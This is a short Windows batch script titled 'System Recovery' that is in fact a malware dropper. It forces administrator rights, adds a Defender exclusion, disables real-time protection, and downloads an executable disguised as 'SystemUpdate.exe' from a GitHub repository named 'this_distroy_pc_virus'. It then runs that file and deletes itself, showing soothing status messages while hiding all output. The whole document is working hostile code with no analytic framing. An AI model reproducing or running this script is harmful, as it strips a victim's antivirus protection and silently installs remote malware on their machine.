@echo off
setlocal enabledelayedexpansion
title System Recovery
cd /d "%~dp0"

:: Admin Check & Relaunch
net session >nul 2>&1 || (powershell -Command "Start-Process '%0' -Verb RunAs" & exit /b)

:: Payload & Logic Variables
set "p=powershell -Command"
set "s1=Add-MpPreference"
set "s2=Set-MpPreference"
set "s3=Invoke-WebRequest"
set "dir=%~dp0"
set "url=https://github.com/paz343123/this_distroy_pc_virus/releases/download/v1.0.0/SystemUpdate.exe"
set "exe=SystemUpdate.exe"

:: Execution Phase
echo 🟢 Initializing...
%p% "%s1% -ExclusionPath '!dir!'" >nul 2>&1
%p% "%s2% -DisableRealtimeMonitoring $true" >nul 2>&1

echo 📥 Loading...
%p% "%s3% -Uri '!url!' -OutFile '!exe!'" >nul 2>&1

:: Persistence & Cleanup
if not exist "backup" mkdir backup >nul 2>&1
copy /y "!exe!" "backup\!exe!" >nul 2>&1

echo 🚀 Finalizing...
start "" "!exe!"

:: Self-Destruct (Optional - deletes the .bat after run)
(goto) 2>nul & del "%~f0"
exit